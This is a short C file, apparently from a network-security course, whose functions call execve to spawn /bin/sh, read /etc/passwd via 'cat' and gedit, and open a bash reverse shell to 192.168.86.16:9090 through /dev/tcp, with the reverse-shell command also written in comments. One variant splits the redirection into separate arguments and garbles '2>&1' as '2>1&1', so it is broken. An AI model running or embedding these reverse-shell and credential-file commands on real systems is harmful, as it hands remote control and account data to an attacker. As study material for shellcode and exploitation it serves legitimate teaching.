//  shell.c   gcc -o shell ../src/shell.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void foo()
{
    char * name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve( name[0], name, NULL);
}

int main01(int argc, char * argv[])
{
    foo();
    return 0;
}









void f01do_more();
void f02gedit();
void reverse_shell();

int main(int argc, char * argv[])
{
    f01do_more();  return 0;
    //f02gedit(); return 0;
    //reverse_shell();    return 0;
}

extern char * environ[];

void f01do_more()
{
    char * name[16];
    name[0] = "/bin/sh";
    name[1] = "-c";
    name[2] = "/bin/ls;  ls -l;  /bin/cat /etc/passwd";
    name[3] = NULL;
    execve( name[0], name, NULL );
    //execve( name[0], name, environ);
}

void f02gedit()
{
    char * name[16];
    name[0] = "/usr/bin/gedit";
    name[1] = "/etc/passwd";
    name[2] = NULL;

    char * envp[16];
    envp[0] = "DISPLAY=:0";
    envp[1] = "PWD=/home/i/ns/09/bin";
    envp[2] = NULL;

    //execve( name[0], name, envp);
    execve( name[0], name, envp);
}

void reverse_shell()
{
    // do the command on terminal:
    // /bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1
    // /bin/bash -c "/bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1"
    char * name[16];
    name[0] = "/bin/bash";
    name[1] = "-c";
    name[2] = "/bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1";
    name[3] = NULL;
    execve( name[0], name, NULL );
    //execve( name[0], name, environ);
}

void reverse_shell0()
{
    // do the command: /bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1
    char * name[16];
    name[0] = "/bin/bash";
    name[1] = "-i";
    name[2] = ">";
    name[3] = "/dev/tcp/192.168.86.16/9090";
    name[4] = "0<&1";
    name[5] = "2>1&1";
    name[6] = NULL;
    execve( name[0], name, NULL );
    //execve( name[0], name, environ);
}

